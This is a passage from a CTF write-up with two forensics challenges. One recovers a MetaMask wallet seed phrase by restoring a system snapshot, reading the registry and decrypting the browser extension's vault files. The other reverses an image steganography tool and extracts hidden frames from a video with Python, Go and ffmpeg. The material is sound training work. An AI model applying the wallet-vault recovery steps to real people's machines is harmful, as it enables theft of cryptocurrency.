one.</p>\n<ul>\n<li>Modifying Disk UUID in the restore point</li>\n</ul>\n<p>You can also modify the  <code>domain.txt</code>  since it contains the old user-id but I believe the Restore point utility can very much detect the change.</p>\n<ul>\n<li>Restoring the system like if it was a real restore point we made.</li>\n</ul>\n<p><img data-src=\"https://i.imgur.com/NW9lTab.png\" alt=\"\"></p>\n<p>We can see a new entry added called “restore_point”, so let’s proceed with it!</p>\n<p>This is the domain thing, hit ‘OK’</p>\n<p><img data-src=\"https://i.imgur.com/VMADEqo.png\" alt=\"\"></p>\n<p>We wait for a quick restart.</p>\n<p><img data-src=\"https://i.imgur.com/X1drpyr.png\" alt=\"\"></p>\n<p>And that’s a success!</p>\n<p>Let’s open the registry now, shall we?</p>\n<p><img data-src=\"https://i.imgur.com/ynNyJqX.png\" alt=\"\"></p>\n<p>And there we go, a key named password containing a string named deleteMe! Bingo!</p>\n<p>At this point, there is only one thing left, let’s get the flag!</p>\n<p>Remember that Ethereum stack exchange question I mentioned earlier? here is the link again, also bring the content of the ldb file’s vault which is near the word “keyring”, you can CTRL+F that in the ldb files and adjust the format if some letters are escaped or encoded because data is never lost, you can also upload the whole file to the <span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZXRhbWFzay5naXRodWIuaW8vdmF1bHQtZGVjcnlwdG9yLw==\">tool</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ldGhlcmV1bS5zdGFja2V4Y2hhbmdlLmNvbS9xdWVzdGlvbnMvNTI2NTgvd2hlcmUtZG9lcy1tZXRhbWFzay1zdG9yZS10aGUtd2FsbGV0LXNlZWQtZmlsZS1wYXRo\">https://ethereum.stackexchange.com/questions/52658/where-does-metamask-store-the-wallet-seed-file-path</span>.</p>\n<p><img data-src=\"https://i.imgur.com/FxNDjWP.png\" alt=\"\"></p>\n<p><img data-src=\"https://i.imgur.com/Mhm1M63.png\" alt=\"\"></p>\n<p>Let’s get our flag now</p>\n<p><img data-src=\"https://i.imgur.com/3tK5T2J.png\" alt=\"\"></p>\n<p>Done, we have some critical information here. The seed phrase! We wrap it in Securinets</p>\n<p><code>Securinets&#123;female-fire-strong-accuse-spring-update-bird-exchange-home-embark-latin-mom&#125;</code></p>\n<p>Thanks for reading, we hope you enjoyed it, and we will be happy to hear your feedback and suggestions.</p>\n<p>GGs <strong>itunderground</strong> for solving this challenge</p>\n<h3 id=\"idea-and-final-words\"><a class=\"markdownIt-Anchor\" href=\"#idea-and-final-words\">#</a> Idea and Final Words</h3>\n<p>Just wanted to use pagefile.sys, hiberfile.sys, the Metamask thing, and Restore points because nobody used them like this in a CTF. So don’t know if that’s a great thing or rather will make players frustrated. Yet, tried to make everything as clear as possible for the players to understand and enjoy the challenge as a whole.</p>\n<h2 id=\"raf-hide\"><a class=\"markdownIt-Anchor\" href=\"#raf-hide\">#</a> Raf Hide</h2>\n<p><img data-src=\"https://i.imgur.com/QRKzGoO.png\" alt=\"\"></p>\n<h3 id=\"description-2\"><a class=\"markdownIt-Anchor\" href=\"#description-2\">#</a> Description:</h3>\n<blockquote Secrect=\"\">\n<p>My friend write a tool that can hide data inside an image. He give me this tool with an anime video without any source code and challenge me to get the secret! . Can you help me extract the flag?<br>\nFlag format: Securinets</p>\n</blockquote>\n<blockquote>\n<p>In this Challenge you will get a go binary and a video! I will not explain how to reverse the binary. The main Idea is to understand what the binary do and extract the data from the video</p>\n</blockquote>\n<p>Author: <strong>Raf²</strong></p>\n<p>Binary: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tLzRuNm5rOHMvcXVhbHMtMjAyMy13cml0ZS11cHMvcmF3L21haW4vUmFmLUhpZGUvcmFmaGlkZQ==\">Download</span></p>\n<p>This is a python version of what the binary can do :</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> PIL <span class=\"keyword\">import</span> Image</span><br><span class=\"line\"><span class=\"keyword\">import</span> argparse</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Create an ArgumentParser object</span></span><br><span class=\"line\">parser = argparse.ArgumentParser(description=<span class=\"string\">&#x27;Example program using options and arguments&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Add options and arguments</span></span><br><span class=\"line\">parser.add_argument(<span class=\"string\">&#x27;-i&#x27;</span>, <span class=\"string\">&#x27;--input&#x27;</span>, <span class=\"built_in\">help</span>=<span class=\"string\">&#x27;select cover-image&#x27;</span>, <span class=\"built_in\">type</span>=<span class=\"built_in\">str</span>)</span><br><span class=\"line\">parser.add_argument(<span class=\"string\">&#x27;-e&#x27;</span>, <span class=\"string\">&#x27;--embedfile&#x27;</span>, <span class=\"built_in\">help</span>=<span class=\"string\">&#x27;select image to be embedded&#x27;</span>, <span class=\"built_in\">type</span>=<span class=\"built_in\">str</span>)</span><br><span class=\"line\">parser.add_argument(<span class=\"string\">&#x27;-o&#x27;</span>, <span class=\"string\">&#x27;--output&#x27;</span>, <span class=\"built_in\">help</span>=<span class=\"string\">&#x27;The output&#x27;</span>, <span class=\"built_in\">type</span>=<span class=\"built_in\">str</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Parse the arguments</span></span><br><span class=\"line\">args = parser.parse_args()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Check if the options and arguments are correct</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> args.<span class=\"built_in\">input</span> <span class=\"keyword\">and</span> args.embedfile <span class=\"keyword\">and</span> args.output:</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;Starting Hiding ...&#x27;</span>)</span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">    <span class=\"comment\"># Provide an usage message if the input is incorrect</span></span><br><span class=\"line\">    parser.print_usage()</span><br><span class=\"line\">    exit()</span><br><span class=\"line\"></span><br><span class=\"line\">image=Image.<span class=\"built_in\">open</span>(args.<span class=\"built_in\">input</span>)</span><br><span class=\"line\">embed=Image.<span class=\"built_in\">open</span>(args.embedfile).convert(<span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\"><span class=\"keyword\">if</span> image.size != embed.size:</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;The Images are not in the same size!&#x27;</span>)</span><br><span class=\"line\">    exit()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">embed_data=embed.load()</span><br><span class=\"line\">image_data=image.load()</span><br><span class=\"line\">index=<span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(image.height):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(image.width):</span><br><span class=\"line\">        flag_pix=<span class=\"built_in\">int</span>(embed_data[i,j])</span><br><span class=\"line\">        flag_pix &amp;=<span class=\"number\">1</span></span><br><span class=\"line\">        im_pix=<span class=\"built_in\">list</span>(image_data[i,j])</span><br><span class=\"line\">        data = ((flag_pix &lt;&lt; index%<span class=\"number\">2</span>) | (<span class=\"number\">254</span>-index%<span class=\"number\">2</span>)) </span><br><span class=\"line\">        <span class=\"keyword\">if</span> flag_pix ==<span class=\"number\">1</span> :</span><br><span class=\"line\">            im_pix[index%<span class=\"number\">3</span>]|= data &amp; (<span class=\"number\">1</span>+index%<span class=\"number\">2</span>)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            im_pix[index%<span class=\"number\">3</span>]&amp;= data</span><br><span class=\"line\">        image_data[i,j]=<span class=\"built_in\">tuple</span>(im_pix)</span><br><span class=\"line\">        index+=<span class=\"number\">1</span></span><br><span class=\"line\">image.save(args.output)</span><br></pre></td></tr></table></figure>\n<p>This is a golang version of what the binary can do :</p>\n<figure class=\"highlight go\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> main</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> (</span><br><span class=\"line\">\t<span class=\"string\">&quot;fmt&quot;</span></span><br><span class=\"line\">\t<span class=\"string\">&quot;image&quot;</span></span><br><span class=\"line\">\t<span class=\"string\">&quot;image/color&quot;</span></span><br><span class=\"line\">\t<span class=\"string\">&quot;image/png&quot;</span></span><br><span class=\"line\">\t<span class=\"string\">&quot;os&quot;</span></span><br><span class=\"line\">\t<span class=\"string\">&quot;flag&quot;</span></span><br><span class=\"line\">)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"title\">main</span><span class=\"params\">()</span></span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">// Create a new FlagSet to parse command line arguments</span></span><br><span class=\"line\">\tflagSet := flag.NewFlagSet(<span class=\"string\">&quot;steganography&quot;</span>, flag.ExitOnError)</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">// Define command line options and arguments</span></span><br><span class=\"line\">\tinputFileName := flagSet.String(<span class=\"string\">&quot;i&quot;</span>, <span class=\"string\">&quot;&quot;</span>, <span class=\"string\">&quot;select cover-image&quot;</span>)</span><br><span class=\"line\">\tembedFileName := flagSet.String(<span class=\"string\">&quot;e&quot;</span>, <span class=\"string\">&quot;&quot;</span>, <span class=\"string\">&quot;select image to be embedded&quot;</span>)</span><br><span class=\"line\">\toutputFileName := flagSet.String(<span class=\"string\">&quot;o&quot;</span>, <span class=\"string\">&quot;&quot;</span>, <span class=\"string\">&quot;The output&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">// Parse the command line arguments</span></span><br><span class=\"line\">\tflagSet.Parse(os.Args[<span class=\"number\">1</span>:])</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">// Check if the options and arguments are correct</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> *inputFileName == <span class=\"string\">&quot;&quot;</span> || *embedFileName == <span class=\"string\">&quot;&quot;</span> || *outputFileName == <span class=\"string\">&quot;&quot;</span> &#123;</span><br><span class=\"line\">\t\tflagSet.Usage()</span><br><span class=\"line\">\t\tos.Exit(<span class=\"number\">1</span>)</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">// Open the input file</span></span><br><span class=\"line\">\tinputFile1, err := os.Open(*embedFileName)</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> err != <span class=\"literal\">nil</span> &#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">panic</span>(err)</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">defer</span> inputFile1.Close()</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">// Decode the PNG image</span></span><br><span class=\"line\">\tinputImage1, _, err := image.Decode(inputFile1)</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> err != <span class=\"literal\">nil</span> &#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">panic</span>(err)</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">// Check if the image is grayscale</span></span><br><span class=\"line\">\tgrayImage, ok := inputImage1.(*image.Gray)</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> !ok &#123;</span><br><span class=\"line\">\t\tfmt.Println(<span class=\"string\">&quot;Error: input image is not grayscale&quot;</span>)</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">// Get the width and height of the image</span></span><br><span class=\"line\">\tembed_width := grayImage.Bounds().Size().X</span><br><span class=\"line\">\tembed_height := grayImage.Bounds().Size().Y</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">// Open the input file</span></span><br><span class=\"line\">\tinputFile, err := os.Open(*inputFileName)</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> err != <span class=\"literal\">nil</span> &#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">panic</span>(err)</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">defer</span> inputFile.Close()</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">// Decode the image as a generic Image interface value</span></span><br><span class=\"line\">\tinputImage, _, err := image.Decode(inputFile)</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> err != <span class=\"literal\">nil</span> &#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">panic</span>(err)</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">// Assert the image to an *image.RGBA or *image.NRGBA value</span></span><br><span class=\"line\">\trgba, ok := inputImage.(*image.RGBA)</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> !ok &#123;</span><br><span class=\"line\">\t\tnrgba, ok := inputImage.(*image.NRGBA)</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> !ok &#123;</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">panic</span>(<span class=\"string\">&quot;Input image format not supported&quot;</span>)</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\trgba = image.NewRGBA(nrgba.Bounds())</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">// Get the width and height of the image</span></span><br><span class=\"line\">\tbounds := rgba.Bounds()</span><br><span class=\"line\">\twidth := bounds.Size().X</span><br><span class=\"line\">\theight := bounds.Size().Y</span><br><span class=\"line\">\tindex:=<span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> width!=embed_width || height!=embed_height &#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">panic</span>(<span class=\"string\">&quot;The Images are not in the same size!&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"comment\">// Invert the colors of the image by subtracting each RGB component from 255</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> y := <span class=\"number\">0</span>; y &lt; height; y++ &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> x := <span class=\"number\">0</span>; x &lt; width; x++ &#123;</span><br><span class=\"line\">\t\t\tintensity := grayImage.GrayAt(x, y).Y &amp; <span class=\"number\">1</span></span><br><span class=\"line\">\t\t\ti:=<span class=\"type\">uint8</span>(index%<span class=\"number\">2</span>)</span><br><span class=\"line\">\t\t\tdata:= ((intensity &lt;&lt; i) | (<span class=\"number\">254</span>-i))</span><br><span class=\"line\">\t\t\tr, g, b, a := rgba.At(x, y).RGBA()</span><br><span class=\"line\">\t\t\tim_pix:= [<span class=\"number\">3</span>]<span class=\"type\">uint8</span>&#123;<span class=\"type\">uint8</span>(r),<span class=\"type\">uint8</span>(g),<span class=\"type\">uint8</span>(b)&#125;</span><br><span class=\"line\">\t\t\tj:= <span class=\"type\">uint</span>(index%<span class=\"number\">3</span>)</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> intensity == <span class=\"number\">1</span> &#123;</span><br><span class=\"line\">\t\t\t\tim_pix[j] = im_pix[j] | (data &amp; (<span class=\"number\">1</span>+i))</span><br><span class=\"line\">\t\t\t&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\t\t\tim_pix[j] = im_pix[j] &amp; data</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\tnewColor := color.RGBA&#123;</span><br><span class=\"line\">\t\t\t\tR: <span class=\"type\">uint8</span>(im_pix[<span class=\"number\">0</span>]),</span><br><span class=\"line\">\t\t\t\tG: <span class=\"type\">uint8</span>(im_pix[<span class=\"number\">1</span>]),</span><br><span class=\"line\">\t\t\t\tB: <span class=\"type\">uint8</span>(im_pix[<span class=\"number\">2</span>]),</span><br><span class=\"line\">\t\t\t\tA: <span class=\"type\">uint8</span>(a),</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\trgba.SetRGBA(x, y, newColor)</span><br><span class=\"line\">\t\t\tindex++</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">// Create the output file</span></span><br><span class=\"line\">\toutputFile, err := os.Create(*outputFileName)</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> err != <span class=\"literal\">nil</span> &#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">panic</span>(err)</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">defer</span> outputFile.Close()</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">// Encode the output image as PNG</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> err := png.Encode(outputFile, rgba); err != <span class=\"literal\">nil</span> &#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">panic</span>(err)</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tfmt.Println(<span class=\"string\">&quot;Output image saved successfully&quot;</span>)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>As we see here this script try to hide image inside another image in a specific way. We need to understand how he hide data.</p>\n<p>The tool take a black-white image that have only 2 values in his pixels and try to inject this pixels in the LSB of RGB channels of the other image!<br>\nBut be carefull is not a traditional or simple LSB steganoraphy here! In each iteration it take a single channel. For example the 1st pixel will use the Red value, 2nd will use the Green value, 3rd will use the Blue and so on.</p>\n<p>We need to reverse this algorithm and write a script that can extract from images used by this tool.</p>\n<p>Let’s use this one!</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> PIL <span class=\"keyword\">import</span> Image</span><br><span class=\"line\"></span><br><span class=\"line\">INPUT_FILFE=<span class=\"string\">&quot;input.png&quot;</span></span><br><span class=\"line\">EXTRACTED_DATA=<span class=\"string\">&quot;extracted.png&quot;</span></span><br><span class=\"line\">image=Image.<span class=\"built_in\">open</span>(INPUT_FILFE)</span><br><span class=\"line\">image_data = image.load()</span><br><span class=\"line\">extracted = Image.new(<span class=\"string\">&#x27;1&#x27;</span>, (image.width,image.height), <span class=\"number\">1</span>)</span><br><span class=\"line\">index=<span class=\"number\">0</span></span><br><span class=\"line\">output_data=extracted.load()</span><br><span class=\"line\"><span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(image.height):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(image.width):  </span><br><span class=\"line\">        im_pix=<span class=\"built_in\">list</span>(image_data[i,j])</span><br><span class=\"line\">        flag_pix = (im_pix[index%<span class=\"number\">3</span>]&amp;(<span class=\"number\">1</span>+index%<span class=\"number\">2</span>)) </span><br><span class=\"line\">        <span class=\"keyword\">if</span> flag_pix &gt;= <span class=\"number\">1</span>:</span><br><span class=\"line\">            flag_pix=<span class=\"number\">255</span></span><br><span class=\"line\">        output_data[i,j]=flag_pix</span><br><span class=\"line\">        index+=<span class=\"number\">1</span></span><br><span class=\"line\">extracted.save(EXTRACTED_DATA)</span><br></pre></td></tr></table></figure>\n<p>To make sure that everything is ok now! We can use the given tool and hide a black-white image and try to extract it with our new script.</p>\n<p>We assume that everything is fine. Let’s take a look now how can we extract data from the video!</p>\n<p><img data-src=\"https://github.com/4n6nk8s/quals-2023-write-ups/raw/main/Raf-Hide/video-gif.gif\" alt=\"\"></p>\n<p>Let’s extract every frame from this video and try to extract a data from it using our last script. Maybe we will find something here!</p>\n<h3 id=\"extract-all-the-frames-using-ffmpeg\"><a class=\"markdownIt-Anchor\" href=\"#extract-all-the-frames-using-ffmpeg\">#</a> Extract all the frames using ffmpeg</h3>\n<p>After running this command. we get 383 frames.</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">raf@Securinets:~$ <span class=\"built_in\">mkdir</span> frames</span><br><span class=\"line\">raf@Securinets:~$ ffmpeg -i challenge.mp4 frames/%3d.png</span><br></pre></td></tr></table></figure>\n<h3 id=\"extract-data-from-each-frame-using-our-solver\"><a class=\"markdownIt-Anchor\" href=\"#extract-data-from-each-frame-using-our-solver\">#</a> Extract data from each frame using our solver</h3>\n<p>Let’s use our solver to try extracting data from each frame.</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">raf@Securinets:~$ <span class=\"built_in\">mkdir</span> data</span><br></pre></td></tr></table></figure>\n<p>We will put our solver inside a function and use a for loop to run it on each frame</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">extract</span>(<span class=\"params\">frame,output</span>):</span><br><span class=\"line\">    image=Image.<span class=\"built_in\">open</span>(frame)</span><br><span class=\"line\">    image_data = image.load()</span><br><span class=\"line\">    extracted = Image.new(<span class=\"string\">&#x27;1&#x27;</span>, (image.width,image.height), <span class=\"number\">1</span>)</span><br><span class=\"line\">    index=<span class=\"number\">0</span></span><br><span class=\"line\">    output_data=extracted.load()</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(image.height):</span><br><span class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(image.width):  </span><br><span class=\"line\">            im_pix=<span class=\"built_in\">list</span>(image_data[i,j])</span><br><span class=\"line\">            flag_pix = (im_pix[index%<span class=\"number\">3</span>]&amp;(<span class=\"number\">1</span>+index%<span class=\"number\">2</span>)) </span><br><span class=\"line\">            <span class=\"keyword\">if</span> flag_pix &gt;= <span class=\"number\">1</span>:</span><br><span class=\"line\">                flag_pix=<span class=\"number\">255</span></span><br><span class=\"line\">            output_data[i,j]=flag_pix</span><br><span class=\"line\">            index+=<span class=\"number\">1</span></span><br><span class=\"line\">    extracted.save(output)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">383</span>):</span><br><span class=\"line\">    index=<span class=\"string\">&quot;0&quot;</span>*(<span class=\"number\">3</span>-<span class=\"built_in\">len</span>(<span class=\"built_in\">str</span>(i+<span class=\"number\">1</span>)))+<span class=\"built_in\">str</span>(i+<span class=\"number\">1</span>)+<span class=\"string\">&quot;.png&quot;</span></span><br><span class=\"line\">    extract(<span class=\"string\">&quot;frames/&quot;</span>+index,<span class=\"string\">&quot;data/&quot;</span>+index)</span><br></pre></td></tr></table></figure>\n<p>Let’s now check the result and what we get!<br>\nOf couse we will get 383 images. But is all the images are usefull or not? Let’s check.</p>\n<p>We find this image extracted from the 1st frame of the image!</p>\n<p><img data-src=\"https://github.com/4n6nk8s/quals-2023-write-ups/raw/main/Raf-Hide/000.png\" alt=\"\"></p>\n<p>Bingo! We are on the right way! The author told us to check the last images! Yeah we will but let’s check what we got in all the images!</p>\n<p>We found a big number of image that have a black line in random position of the image!</p>\n<p float=\"left\">\n  <img data-src=\"https://github.com/4n6nk8s/quals-2023-write-ups/raw/main/Raf-Hide/015.png\" width=\"450\" style=\"margin-right:50px;\" />\n  <img 